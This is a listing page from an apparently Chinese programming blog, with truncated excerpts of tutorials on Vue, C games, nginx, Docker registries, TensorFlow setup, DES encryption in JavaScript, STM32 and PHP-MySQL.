a = [ ''.join( [ ( 'Love'[(x-y)%len('Love')] if ((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3&lt;=0 else' ' ) for x in range(-30,30) ] ) for y in range(15,-15,-1) ] print(‘\n’.join(a))
输出 I 爱 U 空格与星号可以换位置，运行会有不一样的效果。
import time y = 2.5 while y&gt;=-1.6: x = -3.0 while x&lt;=4.0: if (x*x+y*y-1)**3&lt;=3.6*x*x*y*y*y or (x&gt;-2.4 and x&lt;-2.1 and y&lt;1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9e2c6ac94f996c023be7156ee665fd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2c9214c6e10c64331428b494fe0bed0/" rel="bookmark">
			vue 项目中刷新页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前最常用的是 this.$router.go(0)，类似直接点浏览器的刷新按钮，此类方法会导致 URL 刷新时闪烁且用户体验极差，这是强刷新。
解决方法 在 app.vue 页面内（如果根组件不叫这个，那就找路由出口 &lt;router-view /&gt; ），通过 v-if 条件渲染是在 DOM树中进行节点的删除和增加，所以浏览器会对其进行回流再渲染。将组件进行卸载，再挂载回去（这期间就会触发生命周期函数，进行请求，数据更新），进行页面的刷新。
在后台管理系统中，一些对话框组件，如果要传值也可以使用这个方法。
&lt;template&gt; &lt;div id="app"&gt; &lt;router-view v-if="isRouterAlive" /&gt; &lt;/div&gt; &lt;/template&gt; ​ &lt;script&gt; export default { name: 'App', provide () { return { reload: this.reload } }, data () { return { isRouterAlive: true } }, methods: { reload () { this.isRouterAlive = false this.$nextTick(function () { this.isRouterAlive = true }) } } } &lt;/script&gt; 然后就可以在任意一个组件内都可以使用 this.reload 方法，实现页面刷新
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2c9214c6e10c64331428b494fe0bed0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/851c17a25fc6b2e1409da2e469237e35/" rel="bookmark">
			扫雷游戏【敢看完就敢教会你】------- C语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、扫雷游戏介绍
二、实现游戏的前期工作
1. 游戏的原理&amp;逻辑
2. 初始化雷区
三、代码实现游戏
1. 实现 test.c 文件
2. 实现 Mine_Sweeper.c 文件
2.1 雷区初始化函数
2.2 埋地雷函数
2.3 展示雷区函数
2.4 排查地雷函数
2.4.1 排查地雷子函数
2.4.2 标记地雷子函数
2.4.3 取消标记子函数
3. 完整代码 四、游戏展示 一、扫雷游戏介绍 《扫雷》是一款大众类的益智小游戏，于1992年发行。游戏目标是在最短的时间内根据点击格子出现的数字找出所有非地雷的格子，同时避免踩到地雷，踩到一个地雷全盘皆输。
玩家需要在雷区中，将所有地雷一一排查出来，同时扫雷游戏提供了插旗标记地雷和取消插旗标记地雷的功能。
本篇博客将会与大家一起学习，如何运用我们所学的C语言知识，来实现这一经典而富有娱乐性的小游戏，冲🐛🐛🐛！！！
※ ( 本篇博客实现的是 9×9 的扫雷游戏，在雷区放置 10 个地雷 )
※ ( 本篇博客采用多文件的方式来实现扫雷游戏 )
test.c - - - - 测试游戏的逻辑
MineSweeper.c - - - - 游戏代码的实现
MineSweeper.h - - - - 游戏代码的声明 ( 函数声明，符号定义 )
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/851c17a25fc6b2e1409da2e469237e35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03669b224e40e810a74afaf5b2cd3961/" rel="bookmark">
			MyBatis-Plus--分页时的排序--方法/教程/实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文网址：MyBatis-Plus--分页时的排序--方法/教程/实例_IT利刃出鞘的博客-CSDN博客
简介 说明
本文用示例介绍MyBtisPlus分页时排序的方法。
分页时排序的方法
后端OrderItems排序后端Wrapper排序前端指定排序 排序涉及到的类
排序涉及到Page类的List&lt;OrderItem&gt; orders;成员，OrderItem定义如下：
public class OrderItem implements Serializable { private static final long serialVersionUID = 1L; //需要进行排序的字段 private String column; // 是否正序排列，默认 true private boolean asc = true; ... } 建库建表 DROP DATABASE IF EXISTS mp; CREATE DATABASE mp DEFAULT CHARACTER SET utf8; USE mp; DROP TABLE IF EXISTS `t_user`; SET NAMES utf8mb4; CREATE TABLE `t_user` ( `id` BIGINT(0) NOT NULL AUTO_INCREMENT, `user_name` VARCHAR(64) NOT NULL COMMENT '用户名（不能重复）', `nick_name` VARCHAR(64) NULL COMMENT '昵称（可以重复）', `email` VARCHAR(64) COMMENT '邮箱', `create_time` DATETIME(0) NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', `update_time` DATETIME(0) NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '修改时间', `deleted_flag` BIGINT(0) NOT NULL DEFAULT 0 COMMENT '0：未删除 其他：已删除', PRIMARY KEY (`id`) USING BTREE, UNIQUE KEY `index_user_name_deleted_flag` (`user_name`, `deleted_flag`), KEY `index_create_time`(`create_time`) ) ENGINE = InnoDB COMMENT = '用户'; INSERT INTO `t_user` VALUES (1, 'knife', '刀刃', 'abc@qq.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03669b224e40e810a74afaf5b2cd3961/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/174eaac27e89bb55d769fd9fe2cc5de6/" rel="bookmark">
			nginx初识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.nginx
1).nginx是什么，做什么
高性能的http和反向代理服务器，占有内存少，并发能力强，为性能优化开发，50000个并发
处理静态文件
热部署，启动容易，7*24小时不间断运行
2).反向代理
1.正向代理：客户端，即浏览器中配置代理服务器，通过代理服务器进行互联网访问
2.反向代理：客户端对代理无感知，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，反向代理服务器选择目标服务器获取数据，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。
3).负载均衡
单个服务器解决不了，我们增加服务器的数量，然后将请求分发到各个服务器上，将原先请求集中到单个服务器上的情况改为将请求分发到多个服务器上，将负载分发到不同的服务器，也就是我们说的负载均衡
4).动静分离
动态页面和静态页面由不同的服务器解析，加快解析速度，降低原来单个服务器的压力
2.nginx安装
1).linux中安装
firewall -cmd --list-all
2).nginx常用命令
要进入nginx目录中
/usr/local/nginx/sbin
查看版本号
./nginx -v
启动
./nginx
关闭
./nginx -s stop
重新加载
./nginx -s reload
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76b1eb0b28d1bb33414787390901248c/" rel="bookmark">
			docker私有仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、docker私有仓库
1.拉取
docker pull registry
2.创建启动容器
docker run -id --name=registry -p 5000:5000 registry
3.浏览器输入地址
http://ip:5000/v2/_catalog
http://192.168.110.139:5000/v2/_catalog
uname -s
uname -m
4.修改damen.json
vim /etc/docker/daemon.json
{
"registry-mirrors": ["https://vwesipli.mirror.aliyuncs.com"],
"insecure-registries":["192.168.110.139:5000"]
}
5.重启docker
systemctl restart docker
docker start registry 二、上传
docker images
1.打标记
docker tag app 192.168.110.139:5000/app
打完标记和之前的 一样的id 不能用id删，只能用名字删
2.上传
docker push 192.168.110.139:5000/app:1
3.拉取
docker images
docker rmi 192.168.110.139:5000/app:1
docker pull 192.168.110.142:5000/app:1
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e523919ff0239ba92c95d7f6a7529040/" rel="bookmark">
			文件管理系统概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件的定义： 一组有意义的信息/数据的集合；
文件应该有哪些属性？
1.文件名：由创建文件的用户决定文件名，同一目录下不允许有重名文件；
2.标识符，尽管同一级目录下不允许有重名文件，但是不同目录下可以有重名的文件，为了区别这些文件，系统给每一个文件都有一个唯一 的标识符，通常表示为文件名后边一大串的字母/数字，
3.类型，设置不同的文件类型的好处：如操作系统可以为不同类型的文件设置默认的打开方式
4.位置，如文件的存放路径（是让用户使用的），以及在外存中的地址（仅操作系统可使用，用户不可见），平时文件是存放在外存中的，当需要使用的时候会将该文件从外存读入到内存中，
5.保护信息：对文件进行保护的访问控制信息；
文件内部的数据应该怎样的组织起来
无结构文件（流式文件）如txt文件----是由一些二进制或字符流组成有结构文件----由一组组相似的记录组成，又称为“记录式文件”，记录是一组相关数据项的集合；
.
文件之间如何组织起来
操作系统应该对上层提供哪些功能？
可以创建文件，读文件，保存文件，写文件，删除文件delete系统调用，打开文件，关闭文件；
读/写之后，需要关闭文件 从上往下看，文件要如何存放在外存
其他需要由操作系统提供的管理功能
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4796d5a16550f7216c9a5a4579807e10/" rel="bookmark">
			常用注解大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java学习中，注解是不可或缺的，有些可以简化代码，有些可以使用功能，下面一一讲解常用的注解。
开始之前，首先在IntelliJ IDEA中安装Lombok插件。
在pom.xml中添加依赖：
&lt;!-- lombok --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; 1 @Slf4j 常用的日志类，相比log4j，多了占位符。在application.yml中配置保存路径 log.addr: /startup-log。
配置不同级别，清除日期，总保存量等。
导入包：
import lombok.extern.slf4j.Slf4j; 控制器在类前加@Slf4j就可以使用，在代码中打印传参等调试信息。
@Slf4j //lombok注解，注入log对象，在代码中直接使用"log"打印日志 public class UserController { Result getUsers(@RequestParam(value = "pageNumber") Integer pageNumber, @RequestParam(value = "pageSize") Integer pageSize){ log.info("查询User,第{}页,每页{}条", pageNumber, pageSize); } } 调用 http://localhost:19999/users?pageNumber=1&amp;pageSize=5，在startup-log中打开info.log
2022-11-07 16:24:05.432 [INFO ] com.jch.controller.UserController.getUsers(UserController.java:26) 查询User,第1页,每页5条
2 @RestController @ResponseBody //返回数据为json格式 相当于在每个方法前加@ResponseBody，表示返回值为json或xml格式写入http response body，而不是跳转 jsp 页面，通常作为接口使用。
3 @Autowired / @Resource/ @Service 导入包：
import org.springframework.beans.factory.annotation.Autowired; 在容器中查询对应 类型 的bean，如果查询结果刚好为一个，就将该bean装配给指定的属性，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4796d5a16550f7216c9a5a4579807e10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/def6b51d62b06efa3def1d8143d26c89/" rel="bookmark">
			element-ui表单校验不能同步结果的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多个表单遍历时，要依次获取各个结果，但是往往拿不到最终结果
let flag=true
this.$refs[‘form’].validate(valid=&gt;{
flag=valid
})
console.log(valid)//永远是true
原因分析： 提示：这里填写问题的分析：
element文档里描述了，validate方法参数为一个回调函数，如果不传则返回一个promise
解决方案： 我们可以在validate的回调参数里放入想执行的方法，也可以不传入回调参数，利用try catch 和async await 让表单校验结果变为同步
let p=this.$refs[‘form’].validate()
try{
await p
}catch(error){
//此处的error为表单校验失败的字段
}
这样就可以同步进行了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/689377ecf13483f6bc4c398653962a9e/" rel="bookmark">
			2021-11-23-GPU版本Tensorflow&#43;Keras环境安装与配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 该文章仅做记录使用，方便后续自己查阅，内容参考及引用皆已标注。目前TensorFlow的最新版本（2.10）已经默认支持CPU和GPU。安装前需要先确认显卡算力是否达到最新版的要求，算力&lt; 3.0的版本本文暂不涉及。自己亲测的组合有以下两种：（1）旧版（3.0 &lt;算力 &lt; 3.5）：python3.6.5+CUDA8.0+cuDNN7.14+tensorflow1.2.0
（2）新版（算力 &gt; 3.5）：python3.8.12+cudatoolkit11.3.1+cudnn8.2.1+tensorflow2.7+Keras2.7本部分内容的参考来源和网址如下，这里仅做整合：
[1] 神经网络框架搭建 by 孙小亘
[2] tensorflow各个版本的CUDA以及cuDNN版本对应关系 by LoveMIss-Y [3] Tensorflow-gpu安装超详细！！！ by 东海扬尘_BingO [4] 维基百科-CUDA简介（无梯子不好打开） 一、TensorFlow的GPU各个版本与CUDA、cuDNN关系[2] 1、显卡算力（compute capability） （1）nvidia官网查看自己显卡的具体算力。
（2）根据维基百科指示查看自己适合的CUDA版本。（该部分图表有待验证）
（3）确认所需的CUDA Toolkit和cuDNN版本[2]，最新版查看TensorFlow官网最底部。
CUDA Toolkit（新版+旧版）、cuDNN（需登陆下载新版+旧版）。
表 GPU-经过官网测试的构建配置 版本Python 版本编译器编译工具cuDNNCUDAtensorflow_gpu-2.6.03.6-3.9MSVC 2019Bazel 3.7.28.111.2tensorflow_gpu-2.5.03.6-3.9MSVC 2019Bazel 3.7.28.111.2tensorflow_gpu-2.4.03.6-3.8MSVC 2019Bazel 3.1.08.011.0tensorflow_gpu-2.3.03.5-3.8MSVC 2019Bazel 3.1.07.610.1tensorflow_gpu-2.2.03.5-3.8MSVC 2019Bazel 2.0.07.610.1tensorflow_gpu-2.1.03.5-3.7MSVC 2019Bazel 0.27.1-0.29.17.610.1tensorflow_gpu-2.0.03.5-3.7MSVC 2017Bazel 0.26.17.410tensorflow_gpu-1.15.03.5-3.7MSVC 2017Bazel 0.26.17.410tensorflow_gpu-1.14.03.5-3.7MSVC 2017Bazel 0.24.1-0.25.27.410tensorflow_gpu-1.13.03.5-3.7MSVC 2015 update 3Bazel 0.19.0-0.21.07.410tensorflow_gpu-1.12.03.5-3.6MSVC 2015 update 3Bazel 0.15.07.29.0tensorflow_gpu-1.11.03.5-3.6MSVC 2015 update 3Bazel 0.15.079tensorflow_gpu-1.10.03.5-3.6MSVC 2015 update 3Cmake v3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/689377ecf13483f6bc4c398653962a9e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/882aa94d75e57f4e37dd855e09b00ff9/" rel="bookmark">
			【论文笔记】Masked Autoencoders Are Scalable Vision Learners
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文 论文标题：Masked Autoencoders Are Scalable Vision Learners
发表于：CVPR2021
论文链接：https://arxiv.org/pdf/2111.06377.pdf
论文代码：https://github.com/facebookresearch/mae
李沐讲解：MAE 论文逐段精读【论文精读】_哔哩哔哩_bilibili
李沐视频笔记：MAE 论文逐段精读【论文精读】 - 哔哩哔哩
拟代码：别再无聊地吹捧了，一起来动手实现 MAE(Masked Autoencoders Are Scalable Vision Learners) 玩玩吧！ - 知乎
知乎分享：如何看待何恺明最新一作论文Masked Autoencoders？ - 知乎
Abstract 本文为计算机视觉领域提出一种可扩展的自监督学习方法：MAE（Masked Autoencoders，掩膜自编码器）。MAE的做法是：随机遮盖输入图片的子块，然后重建丢失像素。其核心设计为：
非对称的编码-解码架构：
编码器的输入为没有被mask的子块；解码器为轻量级（解码器仅在图像重建的预训练中起作用，因此解码器设计可以独立于编码器，且灵活和轻量级），输入为编码器的输出和被mask部分的位置信息，输出为待重建的丢失像素的值。
高比例mask情况下的自监督：
高比例指75%；作者认为这对计算机而言不容易，但有意义。 通过以上两点，可加速模型训练（3倍或以上，因为编码器只输入未被mask的部分，数据量少）、提高准确率、泛化性好（因其可扩展而可训大模型）。仅使用 ImageNet-1K 数据，vanilla ViT-Huge 模型实现了最佳准确率 (87.8%，超过了之前所有只使用ImageNet-1K数据的结果)。并且其下游任务的迁移也优于监督训练，证明可扩展能力很可观。 极致精简版 用下面几句话来简单说明下这篇文章：
恺明出品，必属精品！MAE延续了其一贯的研究风格：简单且实用；
MAE兴起于去噪自编码，但兴盛于NLP的BERT。那么是什么导致了MAE在CV与NLP中表现的差异呢？这是本文的出发点。
角度一：CV与NLP的架构不同。CV中常采用卷积这种具有”规则性“的操作，直到近期ViT（Vision Transformer）才打破了架构差异；
角度二：信息密度不同。语言是人发明的，具有高语义与信息稠密性；而图像则是自然信号具有重度空间冗余：遗失块可以通过近邻块重建且无需任何全局性理解。为克服这种差异，我们采用了一种简单的策略：高比例随机块掩码，大幅降低冗余。
角度三：自编码器的解码器在重建方面的作用不同。在视觉任务方面，解码器进行像素重建，具有更低语义信息；而在NLP中，解码器预测遗失的词，包含丰富的语义信息。
基于上述三点分析，作者提出了一种非常简单的用于视觉表达学习的掩码自编码器MAE。
MAE采用了非对称的编解码器架构，编码器仅作用于可见图像块(即输入图像块中一定比例进行丢弃，丢弃比例高达75%)并生成隐式表达，解码器则以掩码token以及隐式表达作为输入并对遗失块进行重建。
搭配MAE的ViT-H取得了ImageNet-1K数据集上的新记录：87.8%；同时，经由MAE预训练的模型具有非常好的泛化性能。
Method 所提MAE是一种非常简单的自编码器方案：基于给定部分观测信息对原始信号进行重建 。类似于其他自编码器，所提MAE包含一个将观测信号映射为隐式表达的编码器，一个用于将隐式表达重建为原始信号的解码器。与经典自编码器不同之处在于：我们采用了非对称设计，这使得编码器仅依赖于部分观测信息(无需掩码token信息)，而轻量解码器则接与所得隐式表达与掩码token进行原始信号重建(可参见下图)。
基本流程：
对图片切分 patch， 随机挑选少部分（比如文中25%）作为网络输入；输入通过 encoder 得到对应编码后的 encoded patches将 encoded patches 还原到对应的原始位置，并在缺失的部分补上 masked patches送入 decoder， 每个 decoder 预测对应 patch 的图像像素点；计算预测的像素和原始图片的像素之间 MSE 作为 loss。取训练完的模型的 encoder 部分作为下游任务的 basemodel 并在下游任务下 finetune。 Masking 参考ViT，我们将输入图像拆分为非重叠块，然后采样一部分块并移除其余块(即Mask)。我们的采样策略非常简单：服从均匀分布的无重复随机采样 。我们将该采样策略称之为“随机采样”。具有高掩码比例的随机采样可以极大程度消除冗余，进而构建一个不会轻易的被近邻块推理解决的任务 (可参考下面图示)。而均匀分布则避免了潜在的中心偏置问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/882aa94d75e57f4e37dd855e09b00ff9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83c7fbe153d942ad585ca3130d68b337/" rel="bookmark">
			FIR IIR 数字滤波器 C&#43;&#43;实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FIR实现，已验证 class CFilter_FIR { public: CFilter_FIR(); virtual ~CFilter_FIR(); private: double *m_pB; double *m_pdata_buf; int m_nB_order; int m_nFirIndex; public: void reset(); /*/*brief:注意：B数组为nB_order个 */ */ void setPara(double B[], int nB_order); double filter(double data); void filter(double data[], int len); void filter(double data_in[], double data_out[], int len); }; cpp文件
CFilter_FIR::CFilter_FIR() { m_pB = NULL; m_pdata_buf = NULL; m_nB_order = 0; m_nFirIndex = 0; } CFilter_FIR::~CFilter_FIR() { if (m_pdata_buf) { delete m_pdata_buf; m_pdata_buf = NULL; } if (m_pB) { delete m_pB; m_pB = NULL; } } /** \brief 将滤波器的内部状态清零 * \return */ void CFilter_FIR::reset() { for(int i = 0; i &lt; m_nB_order; i++) { m_pdata_buf[i] = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83c7fbe153d942ad585ca3130d68b337/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db7cf9b32b47a878d71bc8dfefacaf2c/" rel="bookmark">
			JavaScript中通过DES实现加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前后端使用HTTP协议进行交互的时候，由于HTTP报文为明文，所以通常情况下对于比较敏感的信息可以通过对称加密在前端加密，然后在后端解密实现"混淆"的效果，避免在传输过程中敏感信息的泄露（如，密码，证件信息等）。
1. 使用Cryto-JS通过DES算法在前端加密
安装：
$ npm install crypto-js 使用DES算法，工作方式为ECB，填充方式为PKcs7
var CryptoJS = require("crypto-js"); const secretKey = 'com.sevenlin.foo.key'; // 密钥 var afterEncrypt = CryptoJS.DES.encrypt('passwordtoecrypt', CryptoJS.enc.Utf8.parse(secretKey), { mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 }).toString() console.log(afterEncrypt); //7D7RsPHmNSlBAaEVgEyE4aL0j1SJtFi9 // 解密 var afterDecrypt = CryptoJS.DES.decrypt(afterEncrypt, CryptoJS.enc.Utf8.parse(secretKey), { mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 }).toString(CryptoJS.enc.Utf8); console.log(afterDecrypt);//passwordtoecrypt 2. js页面实现DES加密
引入cryto-js包
&lt;script src="https://cdn.bootcss.com/cryto-js/3.1.9-1/cryto-js.min.js"&gt;&lt;/script&gt; 不同的项目可能引入的包不一样，接下来的加密方法和上面就一样了。
原链接：https://www.jianshu.com/p/24691c8d722c
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53b48b2d30581c28bbef8e01138a69b4/" rel="bookmark">
			flutter.sdk not set in local.properties. Expression: (flutterSdkPath != null). Values: flutterSdkPat
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		重点就是local.properties的配置了，一句就完事
这里是报错的地方，有一个解决方案直接把这里换成了本地路径。不知道有没有副作用。
这里的properties.getProperty获取的路径时flutter.sdk，所以在local.properties里配置一下sdk的本地路径就好了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0202ac5d2ba2d992782fd27961f3cc31/" rel="bookmark">
			【vue3 中使用highlight.js实现代码高亮，开箱即用，非常方便】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		highlight.js代码高亮 使用highlight.js直接封装，复制即可使用。先看效果
项目中安装 npm i highlight.js yarn add hightlight.js 编写Highlight组件
以下代码复制即可使用。 &lt;template&gt; &lt;div class="hljs-container"&gt; &lt;pre&gt; &lt;code class="hl-css" :language="type"&gt; {{code}} &lt;/code&gt; &lt;/pre&gt; &lt;/div&gt; &lt;/template&gt; &lt;script setup&gt; //引入样式 github stackflow-dack // import 'highlight.js/styles/stackoverflow-dark.css' import hljs from 'highlight.js' import { onMounted } from "vue"; const props = defineProps({ code: String, type: String, theme: String, }) onMounted(()=&gt;{ const blocks = document.querySelectorAll('pre code'); blocks.forEach((block) =&gt; { hljs.highlightBlock(block); // 从这开始是设置行号 把每一行代码放入li标签中实现行号 block.innerHTML = `&lt;ol data-v-589b9458&gt;&lt;li data-v-589b9458&gt;${block.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0202ac5d2ba2d992782fd27961f3cc31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2453e5495aceb51c5ddc9be727c6f32/" rel="bookmark">
			vue3之promise
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：
vue3之promise_默默努力的小老弟的博客-CSDN博客_vue3中promise
1.promise是什么? 1.解决异步嵌套的问题 2.解决回调问题
(函数里面有函数 保证执行顺序)
3.链式的思想连接其他异步
异步的执行顺序是不确定的…
容器内部有3种状态: (状态不可回退)
1.Pending 对象创建的初始状态(悬而未决)
2.Fullfilled 成功(执行)
3.Rejected 失败
2.使用
//读文件的操作
const fs=require('fs');
const path=require('path');
let p=new Promise((resolve,reject)=&gt;{
fs.readFile((err,data)=&gt;{
if(err){
reject(err);//输出错误
}
resolve(data);//输出数据
});
});
p.then((data)=&gt;{
console.log(data.toString());
}).catch((err)=&gt;{
console.log(err);
});//拿到promise对象操作数据,如果有异常执行catch里面的
3.promise是链式的(data的数据可以.then向下传递 )(在中间出错不会执行后面的)
//读文件的操作
1
const fs=require('fs');
const path=require('path');
let ps=new Promise((resolve,reject)=&gt;{
fs.readFile(path.join(__dirname,'a.txt'),(err,data)=&gt;{
console.log(data.toString());
if(err){
reject()
}
resolve(data)
});
}).then((data)=&gt;{
new Promise((resolve,reject)=&gt;{
fs.readFile(path.join(__dirname,'b.txt'),(err,data)=&gt;{
console.log(data.toString());
if(err){
reject()
}
resolve(data)
});
});
}).then((data)=&gt;{
new Promise((resolve,reject)=&gt;{
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2453e5495aceb51c5ddc9be727c6f32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7402278acbe0ff3716beda9cad6e845/" rel="bookmark">
			基于STM32-Socket-Qt 遥控小车(一代)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、项目分析1. 项目简介2. 知识储备3. 硬件选择 二、STM32部分三、QT部分四、遥控小车演示程序源码 一、项目分析 1. 项目简介 本项目本质为客户端与服务器之间的通信，通过发送不同的指令，服务器和客户端进行不同的操作。
客户端：基于STM32制作简单行驶小车
服务器：安卓手机，基于Socket编程下 用QT进行安卓开发，将app传输到手机上。
TCP通信：ESP8266
手机端发送不同指令，小车执行不同操作
2. 知识储备 STM32基础 可移步 “ STM32专栏 ” 进行知识充能ESP8266WiFi模块 可移步 “ ESP8266WiFi模块的基本通信 ” 学习使用Socket编程基础 可移步 “ Socket编程基础 ” 学习使用QT_Socket_TCP 可移步 “ QT_Socket_tcp通信 ” 学习使用QT_Android环境搭建 可移步 “ QT Android环境搭建 ” 学习使用 3. 硬件选择 1. esp8266WiFi模块
2. 直流电机
(笔者这里用编码器电机代替，普通直流电机即可)
3. STM32F103C8T8
4. 驱动电机模块
(笔者这里用的是TB6612，L298N啥的都行)
5. 烧写器 ST-Link
6. 安卓手机
7. 电池、杜邦线、螺母、轮胎等等
二、STM32部分 1. pwm
void TIM3_PWM_Init(u16 per,u16 psc) { /*使能TIM4时钟*/ RCC_APB1PeriphClockCmd(RCC_APB1Periph_TIM3,ENABLE); /*使能GPIO*/ RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA,ENABLE); RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB,ENABLE); /*使能AFIO*/ RCC_APB2PeriphClockCmd(RCC_APB2Periph_AFIO,ENABLE); /*配置GPIO*/ GPIO_InitTypeDef GPIO_InitStructure; GPIO_InitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7402278acbe0ff3716beda9cad6e845/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4283652ff37628ddba0dab5a41bf575/" rel="bookmark">
			啊哈C语言——让计算机做加法运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		啊哈C语言——让计算机做加法运算 通过前面的学习，我们知道了如何计算机开口说话
那么现在，我们来看看计算机如何做加法运算。
加法 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ int a,b,c; a = 1; b = 2; c = a+b; printf("c的值为%d",c); return 0; } 我们看一下结果
分析一下代码。
int a,b,c;
是创建了a b c这三个变量，并且是整数变量。
意思就是不能带小数点
int a,b,c; int a; int b; int c; 你也可以一个一个的创建。
然后把1这个整数给了a。
把2这个整数给了b
c = a+b也就是c = 1+2
这边要注意的是，c语言必须预先声明变量，如果你之前没有int c;，那么运行到
c = a+b时就会报错
然后就是printf(“c的值为%d”,c);
在这里%d是占位符，就是先给c占个位置，等c到了，c自然就坐在了%d这个位置。
所以最后的结果是
c的值为3，而不是c的值为%d
我们将程序改进一下。
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ int a,b,c; a = 1; b = 2; c = a+b; printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4283652ff37628ddba0dab5a41bf575/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47062f04c2f7717243321f0525c6d23c/" rel="bookmark">
			PHP基础学习第二十篇（MySQL的插入数据、MySQL读取数据、where子句、Order By关键字、MySQL更新和删除数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用mysqli插入数据 在创建完数据库和表后，可以向表中添加数据；
语法：
PHP中SQL查询语句必须使用引号，在SQL查询语句中的字符串值必须加引号；
数值的值不需要引号
null的值不需要引号
INSERT INTO TABLE_name(column1,column2,column3,...)VALUES(value1,value2,value3,...)
在前面PHP基础学习第十九篇创建了表“table2”，表的字段有：“id”，“real_name”，“sex”，“birthday”，和“in_date”。
代码如下：
$sql="INSERT INTO table2(real_name,sex,birthday) VALUE('XM','man','2002-10-22')"; if(mysqli_query($conn,$sql)){ echo"成功"; }else{ echo"失败".$sql.mysqli_error($conn); } 插入多条数据。
代码如下：
